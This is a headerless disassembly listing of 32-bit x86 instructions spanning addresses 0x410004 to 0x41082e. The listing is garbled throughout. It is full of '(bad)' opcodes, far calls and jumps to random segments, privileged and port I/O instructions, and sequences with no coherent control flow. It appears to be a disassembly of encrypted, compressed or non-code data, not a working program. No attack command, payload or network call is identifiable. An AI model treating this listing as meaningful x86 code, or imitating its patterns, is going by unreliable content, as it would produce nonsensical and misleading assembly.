  410004:	or     ah,BYTE PTR [esi+0x69]
  410007:	xchg   DWORD PTR [ecx],esp
  410009:	sbb    eax,eax
  41000b:	or     DWORD PTR [eax+0x7e22a87f],ebp
  410011:	push   ebp
  410012:	xchg   ebx,eax
  410013:	jne    0x41000c
  410015:	xchg   dl,bh
  410017:	enter  0x439,0xa8
  41001b:	or     al,0xfd
  41001d:	mov    ch,BYTE PTR [ebx]
  41001f:	jb     0x410041
  410021:	lock jp 0x410052
  410024:	jmp    0x56b005e7
  410029:	call   0x4258:0x3360369
  410030:	iret   
  410031:	arpl   WORD PTR [ecx+0x4ba83fc0],si
  410037:	adc    dh,BYTE PTR [ebp-0x3204734d]
  41003d:	rcr    BYTE PTR [esi+0x6b7af0cb],0x8e
  410044:	xchg   BYTE PTR [edi+0x1],bl
  410047:	lods   eax,DWORD PTR ds:[esi]
  410048:	fs sbb al,0x98
  41004b:	mov    al,ds:0x4ec6d219
  410050:	scas   al,BYTE PTR es:[edi]
  410051:	sbb    al,BYTE PTR [ecx]
  410053:	add    BYTE PTR [esi-0x4ecf4f2e],bl
  410059:	or     ah,BYTE PTR [ecx]
  41005b:	jp     0x410020
  41005d:	sub    esp,DWORD PTR [esi-0x7]
  410060:	sbb    al,0xd
  410062:	push   edx
  410063:	add    bl,BYTE PTR ss:[edx+0x1fe3bdf8]
  41006a:	icebp  
  41006b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41006c:	lahf   
  41006d:	mov    esi,0xaa5cbe28
  410072:	and    al,0x95
  410074:	pop    ebx
  410075:	ins    DWORD PTR es:[edi],dx
  410076:	fnsave [edi-0x6f]
  410079:	sub    eax,0x1c917a7a
  41007e:	retf   
  41007f:	fstp   TBYTE PTR [edx-0x688a5c22]
  410085:	rcr    DWORD PTR [esi+0x5d],cl
  410088:	scas   al,BYTE PTR es:[edi]
  410089:	es out 0x29,eax
  41008c:	jae    0x410012
  41008e:	outs   dx,BYTE PTR ds:[esi]
  41008f:	or     al,0xa0
  410091:	xor    ecx,DWORD PTR [ebx-0x6e]
  410094:	cmp    ebp,eax
  410096:	inc    ebp
  410097:	test   eax,0xd129bb7c
  41009c:	adc    eax,0x551b1ed9
  4100a1:	mov    esi,0xc8225a96
  4100a6:	call   0x3abde802
  4100ab:	add    BYTE PTR [edx-0x717ca95b],0x3f
  4100b2:	push   edx
  4100b3:	push   ds
  4100b4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4100b5:	and    dh,ch
  4100b7:	rcl    BYTE PTR [ebp+0x2e],1
  4100ba:	push   0x2d
  4100bc:	pop    ebx
  4100bd:	mov    ch,0xfd
  4100bf:	test   eax,0xdefd6077
  4100c4:	addr16 cld 
  4100c6:	xor    DWORD PTR [edx],ebp
  4100c8:	cs sahf 
  4100ca:	xor    eax,0x9475884f
  4100cf:	fwait
  4100d0:	pop    ebp
  4100d1:	jge    0x4100e9
  4100d3:	fnsave [edi+0x2a570280]
  4100d9:	ret    0x6305
  4100dc:	sub    BYTE PTR gs:[eax],dl
  4100df:	dec    edx
  4100e0:	loopne 0x41013f
  4100e2:	inc    edx
  4100e3:	mov    cl,0xb5
  4100e5:	mov    ch,0xdf
  4100e7:	cmp    BYTE PTR [esi-0x29eb0bb8],dh
  4100ed:	mov    edi,0x9274693c
  4100f2:	pop    edi
  4100f3:	fdivrp st(4),st
  4100f5:	loopne 0x41007b
  4100f7:	mov    ds:0x3a1e8f38,eax
  4100fc:	xor    ecx,DWORD PTR [ebx-0x3e]
  4100ff:	ins    BYTE PTR es:[edi],dx
  410100:	shl    BYTE PTR [ecx+0xe],0x3
  410104:	push   ecx
  410105:	jo     0x4100cd
  410107:	shr    DWORD PTR [edx+edx*8-0x263726db],cl
  41010e:	imul   ecx,DWORD PTR [ebx-0x6f83eeac],0xc
  410115:	push   0xa934b6b0
  41011a:	jnp    0x410144
  41011c:	mov    ecx,0xac7ae92e
  410121:	mov    edi,edi
  410123:	mov    esi,0x3fda6262
  410128:	shl    DWORD PTR [ecx+eax*8],0xcc
  41012c:	sbb    eax,0x8ddc25e2
  410131:	jmp    0xa93c:0xa87d383d
  410138:	loopne 0x410123
  41013a:	push   eax
  41013b:	pushf  
  41013c:	gs pop edi
  41013e:	bound  edx,QWORD PTR [edi-0x67]
  410141:	cld    
  410142:	sbb    BYTE PTR [ebp+0x51a87786],al
  410148:	inc    edi
  410149:	fldenv [edx-0x5fd3c73]
  41014f:	or     BYTE PTR [edx],bh
  410151:	and    eax,0x8ba709c4
  410156:	or     al,BYTE PTR [ebp-0x76]
  410159:	lea    ecx,[eax]
  41015b:	sub    bl,BYTE PTR [eax+0x55ef7411]
  410161:	dec    esp
  410162:	fdivrp st(5),st
  410164:	nop
  410165:	sub    eax,DWORD PTR [edi+0x5415d587]
  41016b:	pop    ss
  41016c:	xchg   edi,eax
  41016d:	retf   
  41016e:	cmp    eax,0x7f3deb5a
  410173:	dec    eax
  410174:	imul   ebp,DWORD PTR [edx-0xd086c47],0x8ab9db61
  41017e:	jno    0x4101d6
  410180:	out    0x7b,al
  410182:	mov    al,ds:0x8d38366f
  410187:	ds ins BYTE PTR es:[edi],dx
  410189:	(bad)  
  41018b:	push   edi
  41018c:	adc    al,0x5
  41018e:	repnz aaa 
  410190:	push   ecx
  410191:	sbb    DWORD PTR [eax+ebx*1],ebp
  410194:	sub    BYTE PTR [esi+0x79716c81],bh
  41019a:	loope  0x41014e
  41019c:	stos   BYTE PTR es:[edi],al
  41019d:	inc    esi
  41019e:	jbe    0x410187
  4101a0:	mov    ebx,0x9c63597d
  4101a5:	aaa    
  4101a6:	pushf  
  4101a7:	mov    ebx,0x44ef6801
  4101ac:	push   edi
  4101ad:	mov    bl,0x3e
  4101af:	and    dl,BYTE PTR [edx-0x30e404c0]
  4101b5:	btc    ecx,esp
  4101b8:	mov    eax,0xc21db626
  4101bd:	mov    ds:0xd95597be,al
  4101c2:	sub    BYTE PTR [eax],al
  4101c4:	mov    esp,0xedae9660
  4101c9:	and    BYTE PTR [ebp+0xb],bh
  4101cc:	mov    ch,0xed
  4101ce:	lods   eax,DWORD PTR ds:[esi]
  4101cf:	inc    ebx
  4101d0:	lods   al,BYTE PTR ds:[esi]
  4101d1:	fld    TBYTE PTR [edx]
  4101d3:	xor    DWORD PTR [eax+0x76],edi
  4101d6:	inc    esp
  4101d7:	push   ss
  4101d8:	inc    esp
  4101d9:	(bad)  
  4101da:	fdivr  QWORD PTR [eax]
  4101dc:	add    edi,DWORD PTR [esi+ebp*8+0x3b280cf9]
  4101e3:	pop    es
  4101e4:	jne    0x4101b6
  4101e6:	push   ds
  4101e7:	int    0x70
  4101e9:	retf   0x7380
  4101ec:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4101ed:	stc    
  4101ee:	or     eax,0xd0a11105
  4101f3:	sub    eax,0xc1c8fcdb
  4101f8:	dec    esp
  4101f9:	add    al,0x9d
  4101fb:	mov    DWORD PTR [ebx-0x37],esi
  4101fe:	fmulp  st(6),st
  410200:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410201:	bound  ebx,QWORD PTR [esi]
  410203:	jmp    DWORD PTR [edi-0x3f2351f0]
  410209:	aam    0x4b
  41020b:	and    al,0x1b
  41020d:	mov    cl,0x16
  41020f:	push   ebp
  410210:	cmp    DWORD PTR [edx-0x7a],ebx
  410213:	or     BYTE PTR [ecx+ecx*1-0x3a2fef03],ch
  41021a:	xchg   BYTE PTR [ebx-0x3a],ch
  41021d:	cld    
  41021e:	xchg   esi,eax
  41021f:	pop    edi
  410220:	cli    
  410221:	adc    eax,0x7481e997
  410226:	std    
  410227:	inc    edi
  410228:	jg     0x410284
  41022a:	test   BYTE PTR [eax-0x1dd15e2a],al
  410230:	push   edi
  410231:	aam    0xf5
  410233:	out    0x5,eax
  410235:	ja     0x41023f
  410237:	push   esp
  410238:	jmp    0xcfec387a
  41023d:	mov    edx,0xc65a2bea
  410242:	(bad)  
  410244:	dec    ebx
  410245:	aaa    
  410246:	or     BYTE PTR [edx],bh
  410248:	add    eax,edx
  41024a:	gs inc edi
  41024c:	retf   
  41024d:	(bad)  
  41024e:	mov    ah,0xc6
  410250:	nop
  410251:	sub    ebx,DWORD PTR ss:[edx+0x619b88c]
  410258:	push   ss
  410259:	inc    eax
  41025a:	pop    esp
  41025b:	xchg   ecx,eax
  41025c:	inc    esp
  41025d:	push   ebx
  41025e:	mov    ecx,0x2b6504d6
  410263:	cmc    
  410264:	std    
  410265:	lds    eax,FWORD PTR [ecx+0x3f4868b9]
  41026b:	fldcw  WORD PTR [esi+eiz*4+0x63]
  41026f:	sbb    DWORD PTR [ebx+eiz*1],0x0
  410273:	jnp    0x41028b
  410275:	(bad)  
  410276:	add    DWORD PTR [ebx+0xa0a25d1],ebx
  41027c:	jbe    0x4102a6
  41027e:	call   0xff5be7f7
  410283:	adc    BYTE PTR [esi-0x4eb8cf91],dl
  410289:	push   cs
  41028a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41028b:	sbb    al,0x13
  41028d:	mov    ah,0x44
  41028f:	leave  
  410290:	pop    es
  410291:	test   eax,0xdd379dcb
  410296:	sbb    eax,0xcc3957cd
  41029b:	out    0x1e,al
  41029d:	dec    ecx
  41029e:	jae    0x4102d3
  4102a0:	js     0x41031f
  4102a2:	mov    esp,DWORD PTR [ebx+esi*4]
  4102a5:	hlt    
  4102a6:	call   0x94a0:0x703a4bd
  4102ad:	shr    BYTE PTR [esi],0x99
  4102b0:	call   0xe54efdcb
  4102b5:	jo     0x410319
  4102b7:	data16 js 0x41028b
  4102ba:	ret    
  4102bb:	std    
  4102bc:	adc    eax,0x9124269d
  4102c1:	jg     0x410330
  4102c3:	xchg   ebp,eax
  4102c4:	push   ebx
  4102c5:	cdq    
  4102c6:	ja     0x410289
  4102c8:	push   ebp
  4102c9:	loope  0x410345
  4102cb:	push   esi
  4102cc:	jno    0x4102ad
  4102ce:	mov    bl,0x9d
  4102d0:	std    
  4102d1:	jmp    0xb98178a4
  4102d6:	dec    edx
  4102d7:	(bad)  
  4102d9:	cli    
  4102da:	jle    0x41030b
  4102dc:	imul   ebx
  4102de:	outs   dx,DWORD PTR ds:[esi]
  4102df:	or     BYTE PTR [esp+ebx*4-0x32],0xc
  4102e4:	or     al,0xab
  4102e6:	ror    DWORD PTR [ecx-0x8d83548],1
  4102ec:	add    ah,ch
  4102ee:	push   0xfffffffb
  4102f0:	push   eax
  4102f1:	xor    BYTE PTR [ecx],al
  4102f3:	je     0x4102d6
  4102f5:	cli    
  4102f6:	cld    
  4102f7:	mov    bh,0x5
  4102f9:	fdivr  st,st(5)
  4102fb:	pop    edi
  4102fc:	pop    ecx
  4102fd:	xchg   edx,eax
  4102fe:	shr    edx,cl
  410300:	mov    dh,0xd0
  410302:	inc    edx
  410303:	sbb    BYTE PTR [edx-0x50],dh
  410306:	outs   dx,BYTE PTR ds:[esi]
  410307:	dec    esi
  410308:	and    DWORD PTR [ebx+ebx*8],0x60009049
  41030f:	push   0x3b9aa233
  410314:	and    DWORD PTR [ebx+0x70],eax
  410317:	loopne 0x410391
  410319:	es or  ch,ah
  41031c:	adc    eax,0x340a66c6
  410321:	inc    edx
  410322:	pop    ss
  410323:	mov    cl,0xf
  410325:	or     dh,BYTE PTR [edx*1-0x2d16efa4]
  41032c:	imul   esp,DWORD PTR [ecx+0x42a2a685],0x65
  410333:	aas    
  410334:	mov    edi,gs
  410336:	mov    eax,ds:0x2a738ad6
  41033b:	jne    0x4102e1
  41033d:	fmul   QWORD PTR [ebx+eax*2+0x7d]
  410341:	pop    ss
  410342:	xchg   edi,eax
  410343:	cmc    
  410344:	ds (bad) 
  410346:	mov    ah,BYTE PTR [esi+0x5f8f0791]
  41034c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41034d:	xor    esp,edi
  41034f:	pop    edi
  410350:	test   BYTE PTR [esp+eax*1],dl
  410353:	adc    DWORD PTR [edi+esi*1-0x6568113c],eax
  41035a:	imul   esi,DWORD PTR [edi+0x41],0x23ce5291
  410361:	dec    esi
  410362:	hlt    
  410363:	imul   ebx,DWORD PTR [edi+0x40c8b3dd],0xffffffeb
  41036a:	and    BYTE PTR [edx],ch
  41036c:	mov    ebx,0x129d0020
  410371:	(bad)  
  410372:	lock ret 0x5990
  410376:	xchg   ecx,eax
  410377:	add    esp,DWORD PTR ds:0x3c6fddad
  41037d:	hlt    
  41037e:	jge    0x410326
  410380:	cwde   
  410381:	test   BYTE PTR [esi-0x6e292ec6],dl
  410387:	jmp    0x4103db
  410389:	inc    edx
  41038a:	popf   
  41038b:	cmp    bl,dl
  41038d:	inc    ebx
  41038e:	mov    ebp,0x7fc9decc
  410393:	ins    DWORD PTR es:[edi],dx
  410394:	mov    ds:0x5084d89,eax
  410399:	and    BYTE PTR [eax],0x0
  41039c:	add    BYTE PTR [ebx+0xd8bfc45],cl
  4103a2:	add    eax,0x30042fd
  4103a7:	or     eax,0x42fd09
  4103ac:	mov    DWORD PTR ds:0x42fd05,ecx
  4103b2:	xor    eax,edx
  4103b4:	sub    DWORD PTR ds:0x42e11c,ebx
  4103ba:	push   esi
  4103bb:	sbb    ecx,ecx
  4103bd:	jmp    0x410787
  4103c2:	lods   al,BYTE PTR ds:[esi]
  4103c3:	das    
  4103c4:	mov    ds:0xaa91a114,al
  4103c9:	mov    bh,0x91
  4103cb:	call   0xe409:0x6fa8bab6
  4103d2:	pop    eax
  4103d3:	mov    edx,0x7da37070
  4103d8:	jo     0x41044a
  4103da:	pusha  
  4103db:	cli    
  4103dc:	aas    
  4103dd:	rcr    esp,0xc3
  4103e0:	cs push ss
  4103e2:	or     DWORD PTR [eax],0x3fd169be
  4103e8:	aas    
  4103e9:	pop    es
  4103ea:	push   edx
  4103eb:	fiadd  DWORD PTR [eax+0x24]
  4103ee:	aas    
  4103ef:	dec    esp
  4103f0:	in     eax,dx
  4103f1:	out    0x30,eax
  4103f3:	iret   
  4103f4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4103f5:	std    
  4103f6:	cli    
  4103f7:	ins    BYTE PTR es:[edi],dx
  4103f8:	into   
  4103f9:	test   al,0xd7
  4103fb:	xchg   esi,eax
  4103fc:	push   edx
  4103fd:	jnp    0x410401
  4103ff:	fadd   DWORD PTR [ebp+0x76e9a988]
  410405:	jbe    0x41042e
  410407:	xchg   ebx,eax
  410408:	sub    BYTE PTR [esi+0x48],ah
  41040b:	popf   
  41040c:	xchg   ebx,eax
  41040d:	pop    eax
  41040e:	or     bh,al
  410410:	int3   
  410411:	jg     0x410435
  410413:	mov    ds:0x56109e0d,eax
  410418:	adc    DWORD PTR [eax+0x6df7e014],eax
  41041e:	mov    cl,0x3b
  410420:	and    cl,BYTE PTR [esi+0x62034165]
  410426:	jecxz  0x4103d3
  410428:	scas   al,BYTE PTR es:[edi]
  410429:	pushf  
  41042a:	(bad)  
  41042b:	adc    esp,ebp
  41042d:	sub    BYTE PTR [ebp+ecx*8-0x7],cl
  410431:	jnp    0x410496
  410433:	adc    eax,0xff63531e
  410438:	and    eax,0xe059e97
  41043d:	scas   eax,DWORD PTR es:[edi]
  41043e:	or     DWORD PTR [ebx+esi*1-0x742c2a82],esi
  410445:	and    bl,BYTE PTR [ecx-0x27]
  410448:	not    DWORD PTR ds:0xa27e469
  41044e:	mov    al,ds:0xc2e4bbbf
  410453:	add    BYTE PTR [ecx-0x3],bh
  410456:	and    bl,cl
  410458:	xchg   ecx,eax
  410459:	in     al,0xe4
  41045b:	push   ebx
  41045c:	xor    eax,0x4963593
  410461:	jbe    0x4104c7
  410463:	ins    DWORD PTR es:[edi],dx
  410464:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410465:	fnsetpm(287 only) 
  410467:	loopne 0x410471
  410469:	repz mov edx,0xb4da3cad
  41046f:	(bad)  
  410471:	(bad)  
  410473:	fild   QWORD PTR [ecx-0x31]
  410476:	pop    ax
  410478:	or     ch,BYTE PTR [edi]
  41047a:	or     BYTE PTR [esi+0x78ddeb68],0x90
  410481:	fmul   DWORD PTR [ecx+0x69]
  410484:	(bad)  
  410485:	aam    0x3f
  410487:	(bad)  
  410488:	pop    edx
  410489:	sbb    ebp,DWORD PTR [ebx+0x4b]
  41048c:	and    edi,DWORD PTR [ebp+0x41]
  41048f:	sub    edx,0x42a23ae0
  410495:	cmp    esi,DWORD PTR [edx-0x7f9b90c0]
  41049b:	mov    ah,0x77
  41049d:	loop   0x41050d
  41049f:	adc    al,0x32
  4104a1:	(bad)  
  4104a2:	addr16 out 0xb6,eax
  4104a5:	pushf  
  4104a6:	xlat   BYTE PTR ds:[ebx]
  4104a7:	push   cs
  4104a8:	adc    eax,0x5a8ad323
  4104ad:	cld    
  4104ae:	sub    al,0xee
  4104b0:	daa    
  4104b1:	jmp    0xab111b5
  4104b6:	(bad)  
  4104b7:	dec    edi
  4104b8:	mov    al,0x61
  4104ba:	sub    bh,0xcc
  4104bd:	addr16 push ebx
  4104bf:	mov    esi,DWORD PTR [ebx+0x6d]
  4104c2:	lea    ebx,[ecx]
  4104c4:	jge    0x410537
  4104c6:	mov    edx,0x5c93a4ff
  4104cb:	lahf   
  4104cc:	shr    DWORD PTR [ebx],0xaf
  4104cf:	shl    BYTE PTR ds:0x65c88dee,cl
  4104d5:	mov    ds:0xc4b0195b,al
  4104da:	mov    al,ds:0x6488d987
  4104df:	inc    ecx
  4104e0:	lods   eax,DWORD PTR ds:[esi]
  4104e1:	cmp    al,0x4d
  4104e3:	ss ss dec ebp
  4104e6:	cdq    
  4104e7:	mov    edx,0xc710081d
  4104ec:	fs inc esp
  4104ee:	lea    ebx,[esi+0x3c24f712]
  4104f4:	sub    BYTE PTR [eax+0x5b62f1f0],ah
  4104fa:	fcom   st(2)
  4104fc:	es inc esi
  4104fe:	push   esi
  4104ff:	in     al,0x86
  410501:	xchg   ebp,eax
  410502:	xor    DWORD PTR [ecx+0x78],0xffffff8d
  410506:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410507:	add    ebp,DWORD PTR [ebx+edx*2+0x744c393c]
  41050e:	xor    DWORD PTR [ebx-0x8],esi
  410511:	(bad)  
  410512:	adc    al,0x26
  410514:	pop    esp
  410515:	ins    DWORD PTR es:[edi],dx
  410516:	add    ah,BYTE PTR [ecx]
  410518:	inc    ebp
  410519:	shl    BYTE PTR [eax],cl
  41051b:	cmp    DWORD PTR [ecx+0x2145be16],ebx
  410521:	adc    ebx,DWORD PTR [ebp-0x65]
  410524:	neg    ebx
  410526:	sar    DWORD PTR [eax+ebx*1+0x1a],cl
  41052a:	jle    0x4104e7
  41052c:	and    DWORD PTR [ecx+edi*2-0x3c],eax
  410530:	stos   BYTE PTR es:[edi],al
  410531:	ror    BYTE PTR [edi+edi*2-0x4a2e9178],0x6
  410539:	jno    0x410574
  41053b:	pop    ds
  41053c:	in     al,0xe
  41053e:	xor    DWORD PTR [eax],edi
  410540:	out    dx,eax
  410541:	xchg   ebp,eax
  410542:	mov    ch,0xb7
  410544:	push   0xf296dab7
  410549:	jnp    0x4104df
  41054b:	dec    edx
  41054c:	(bad)  
  41054e:	ins    BYTE PTR es:[edi],dx
  41054f:	cwde   
  410550:	mov    ebp,DWORD PTR [eax]
  410552:	mov    ds:0x91da2ca0,al
  410557:	jmp    0x4105c6
  410559:	icebp  
  41055a:	cld    
  41055b:	sbb    ecx,DWORD PTR [ecx+0x290bc76b]
  410561:	xchg   ecx,eax
  410562:	fyl2xp1 
  410564:	gs (bad) 
  410566:	adc    esp,DWORD PTR gs:[eax]
  410569:	adc    eax,0x4dcccec1
  41056e:	and    al,0x5
  410570:	aam    0xef
  410572:	xchg   esi,eax
  410573:	not    DWORD PTR [eax+0x3d]
  410576:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410577:	xchg   ecx,eax
  410578:	pushf  
  410579:	das    
  41057a:	les    eax,FWORD PTR [edx+0x1dfcfec5]
  410580:	add    BYTE PTR [eax-0x608a943b],dl
  410586:	bound  edx,QWORD PTR [ebp+0x3dddcfec]
  41058c:	add    edi,DWORD PTR [edi+0x6e3f584d]
  410592:	mov    ds:0xa2de55c1,al
  410597:	lods   eax,DWORD PTR ds:[esi]
  410598:	pop    esi
  410599:	cmp    eax,0x50fae668
  41059e:	fs dec ebp
  4105a0:	xor    eax,0xaf9ea59d
  4105a5:	bound  edi,QWORD PTR [edi]
  4105a7:	int3   
  4105a8:	sar    ecx,1
  4105aa:	mov    ds:0xb8938d31,al
  4105af:	dec    eax
  4105b0:	mov    ch,0x7e
  4105b2:	mov    esp,0x8ae91aa
  4105b7:	mov    edi,eax
  4105b9:	js     0x41057b
  4105bb:	outs   dx,DWORD PTR ds:[esi]
  4105bc:	mov    es,esi
  4105be:	lds    esp,FWORD PTR [ebp+0x70]
  4105c1:	ss xchg ecx,eax
  4105c3:	cmp    DWORD PTR [ebp-0x2098451e],ecx
  4105c9:	sbb    esp,DWORD PTR ds:0x763d24fa
  4105cf:	sbb    BYTE PTR [ecx],dh
  4105d1:	push   eax
  4105d2:	push   ss
  4105d3:	in     eax,0x6a
  4105d5:	jne    0x4105f6
  4105d7:	fnsave [edi-0x3c]
  4105da:	pop    ebp
  4105db:	test   al,0x41
  4105dd:	push   ss
  4105de:	call   0x1fc4b8a5
  4105e3:	xchg   edi,eax
  4105e4:	das    
  4105e5:	in     al,0x56
  4105e7:	rol    BYTE PTR [eax],1
  4105e9:	push   ebp
  4105ea:	adc    ah,BYTE PTR [ecx]
  4105ec:	mov    al,0xf4
  4105ee:	fidivr DWORD PTR [ebx]
  4105f0:	imul   esi,DWORD PTR [esi-0x239f85d2],0x522a12e9
  4105fa:	mov    eax,ds:0x406c830b
  4105ff:	icebp  
  410600:	test   DWORD PTR [eax],edx
  410602:	in     al,dx
  410603:	dec    ebx
  410604:	cmp    BYTE PTR [edx],bh
  410606:	call   0x723:0xd5126d98
  41060d:	int    0xe
  41060f:	repz int3 
  410611:	adc    dh,al
  410613:	enter  0x294e,0xb
  410617:	loop   0x41062a
  410619:	sahf   
  41061a:	pop    es
  41061b:	sub    eax,0x54c1ee88
  410620:	call   0x4e0fa263
  410625:	mov    esi,ebx
  410627:	jg     0x41066a
  410629:	xchg   esi,eax
  41062a:	test   al,0xa2
  41062c:	daa    
  41062d:	xchg   esi,eax
  41062e:	sub    eax,0x65eb921c
  410633:	inc    ecx
  410634:	mov    cl,0x41
  410636:	test   eax,0x1387d21f
  41063b:	outs   dx,DWORD PTR ds:[esi]
  41063c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41063d:	adc    dl,al
  41063f:	xor    BYTE PTR [esi+0x12355ea9],dh
  410645:	mov    bl,0x13
  410647:	stos   BYTE PTR es:[edi],al
  410648:	sub    BYTE PTR [ecx+0x64],ch
  41064b:	sbb    eax,0x9c2e3fcf
  410650:	imul   DWORD PTR [ecx+eax*2+0x49]
  410654:	dec    ebp
  410655:	dec    esi
  410656:	jns    0x4106cc
  410658:	cmp    dl,BYTE PTR [ebp+ebp*4-0xe]
  41065c:	mov    ah,0xb1
  41065e:	or     BYTE PTR [ebx+0x75a017bf],al
  410664:	enter  0xf684,0x50
  410668:	les    esp,FWORD PTR fs:[esi+0x326db020]
  41066f:	xor    eax,0x226a7a5
  410674:	mov    ecx,0x3201d1e9
  410679:	(bad)  
  41067a:	in     eax,0xca
  41067c:	pop    ss
  41067d:	xchg   DWORD PTR [ebx-0x3eaf602e],ecx
  410683:	repz pop edi
  410685:	in     eax,dx
  410686:	sub    bh,bl
  410688:	inc    esi
  410689:	nop
  41068a:	fbstp  TBYTE PTR [edx+ebx*4]
  41068d:	push   esi
  41068e:	pop    ecx
  41068f:	(bad)  
  410690:	shl    ah,cl
  410692:	inc    edi
  410693:	aad    0x4f
  410695:	push   eax
  410696:	sub    eax,0x99fb265e
  41069b:	adc    eax,0x156b5a4d
  4106a0:	sbb    al,BYTE PTR [ebx-0x80]
  4106a3:	add    ebp,DWORD PTR [ecx-0x7a62b892]
  4106a9:	inc    ecx
  4106aa:	push   ds
  4106ab:	mov    al,0x30
  4106ad:	dec    ebp
  4106ae:	push   es
  4106af:	(bad)  
  4106b0:	cli    
  4106b1:	test   BYTE PTR [ebp+0x29],0x19
  4106b5:	outs   dx,DWORD PTR ds:[esi]
  4106b6:	inc    esi
  4106b7:	(bad)  
  4106b8:	dec    esi
  4106b9:	shl    BYTE PTR [eax+0x74],1
  4106bc:	lea    esp,[esi+0x2582b28c]
  4106c2:	mov    edx,esp
  4106c4:	cmp    ebx,ebp
  4106c6:	in     al,dx
  4106c7:	jne    0x410652
  4106c9:	push   cs
  4106ca:	cmp    ah,ah
  4106cc:	push   eax
  4106cd:	cld    
  4106ce:	inc    edi
  4106cf:	mov    dl,0x35
  4106d1:	cmc    
  4106d2:	adc    eax,0xc51ced03
  4106d7:	adc    ah,cl
  4106d9:	push   ecx
  4106da:	mov    bl,0x4a
  4106dc:	mov    WORD PTR [ebx-0x79],?
  4106df:	pop    edx
  4106e0:	inc    ecx
  4106e1:	adc    eax,0x41436548
  4106e6:	mov    esp,0x7ef8d5e1
  4106eb:	adc    DWORD PTR [edi+esi*2+0x75],0x69071631
  4106f3:	jnp    0x4106d4
  4106f5:	add    eax,0xd3995c68
  4106fa:	mov    eax,0x127cd020
  4106ff:	dec    edi
  410700:	mov    eax,0xa90960b
  410705:	mov    esi,DWORD PTR [ecx+0x18eb8f0b]
  41070b:	scas   al,BYTE PTR es:[edi]
  41070c:	pusha  
  41070d:	or     BYTE PTR [edi],bl
  41070f:	inc    edx
  410710:	js     0x4106c5
  410712:	cmp    DWORD PTR [eax+ecx*8+0x64eaeb9],esi
  410719:	arpl   WORD PTR [ecx-0x4d],ax
  41071c:	call   0x79a6:0x2be9e62
  410723:	jmp    0x57d8:0xbf8405cb
  41072a:	adc    BYTE PTR [esi+0x65],ch
  41072d:	xchg   esi,eax
  41072e:	and    ecx,DWORD PTR [ebp-0x75]
  410731:	xchg   edi,eax
  410732:	loopne 0x410746
  410734:	fbstp  TBYTE PTR [ebx-0x2d1f7f52]
  41073a:	rol    BYTE PTR [esi],1
  41073c:	mov    eax,0xc0265b94
  410741:	sahf   
  410742:	inc    edi
  410743:	mov    ch,0x87
  410745:	mov    edx,0x3408a5e4
  41074a:	cwde   
  41074b:	ret    
  41074c:	pop    eax
  41074d:	cmp    eax,0x25411a2b
  410752:	daa    
  410753:	jb     0x4107a9
  410755:	dec    eax
  410756:	or     BYTE PTR [edx+0x65181dbc],bl
  41075c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41075d:	out    0x1e,al
  41075f:	cmp    ecx,0xfffffff3
  410762:	cs sub eax,0x65615058
  410768:	push   ebx
  410769:	js     0x410772
  41076b:	dec    DWORD PTR [edx-0x684ca3c5]
  410771:	mov    edx,esp
  410773:	leave  
  410774:	push   eax
  410775:	lea    esp,[eax+eax*8+0x61]
  410779:	cmp    al,0x35
  41077b:	pop    ecx
  41077c:	out    dx,eax
  41077d:	pop    esi
  41077e:	push   0x18855298
  410783:	ds adc al,0x3a
  410786:	push   ss
  410787:	mov    esi,DWORD PTR [ebp+0x8]
  41078a:	sbb    ecx,0x2f26
  410790:	mov    ecx,0x32729c
  410795:	add    eax,ecx
  410797:	jmp    0x410b61
  41079c:	outs   dx,DWORD PTR ds:[esi]
  41079d:	mov    ebp,ds
  41079f:	or     al,0xd9
  4107a1:	imul   ebp,DWORD PTR [ecx+0x6b],0x19f67ea1
  4107a8:	sti    
  4107a9:	jge    0x410795
  4107ab:	mov    bl,0x8b
  4107ad:	inc    esi
  4107ae:	jo     0x410820
  4107b0:	mov    ds:0x3070707d,eax
  4107b5:	out    dx,al
  4107b6:	mov    cs,WORD PTR [edi+0x1ef39a48]
  4107bc:	jle    0x4107a5
  4107be:	fcomip st,st(2)
  4107c0:	xor    al,0x8b
  4107c2:	jp     0x4107b4
  4107c4:	in     al,dx
  4107c5:	and    BYTE PTR [esi],cl
  4107c7:	xchg   esi,eax
  4107c8:	mov    edx,0x1836495a
  4107cd:	aad    0x61
  4107cf:	out    0x39,eax
  4107d1:	lahf   
  4107d2:	jbe    0x410846
  4107d4:	dec    ecx
  4107d5:	cwde   
  4107d6:	sti    
  4107d7:	loop   0x41075f
  4107d9:	push   ss
  4107da:	inc    ebx
  4107db:	jbe    0x410843
  4107dd:	mov    ?,esi
  4107df:	dec    edi
  4107e0:	test   eax,0xd985f748
  4107e5:	push   ebp
  4107e6:	lds    esp,FWORD PTR [edx-0x70455c4c]
  4107ec:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4107ed:	jecxz  0x4107a2
  4107ef:	pop    eax
  4107f0:	call   0xda2c:0x78bd7105
  4107f7:	lods   al,BYTE PTR ds:[esi]
  4107f8:	hlt    
  4107f9:	ror    DWORD PTR [eax],0x1f
  4107fc:	sar    DWORD PTR [esp+ebx*1],cl
  4107ff:	bound  esp,QWORD PTR [eax+0x55]
  410802:	call   0xa6f76650
  410807:	or     bh,0x4
  41080a:	data16 (bad) 
  41080c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41080d:	std    
  41080e:	and    ebx,ebx
  410810:	push   esp
  410811:	loopne 0x410881
  410813:	dec    edx
  410814:	rol    BYTE PTR [esi+0x55],0xd4
  410818:	push   ebp
  410819:	inc    edx
  41081a:	lahf   
  41081b:	enter  0xaf03,0xc3
  41081f:	outs   dx,DWORD PTR ds:[esi]
  410820:	inc    esi
  410821:	call   0xb695:0x7c6a83e0
  410828:	(bad)  
  410829:	je     0x4107b2
  41082b:	pusha  
  41082c:	sub    al,0x6
  41082e:	push   0x65d0548e
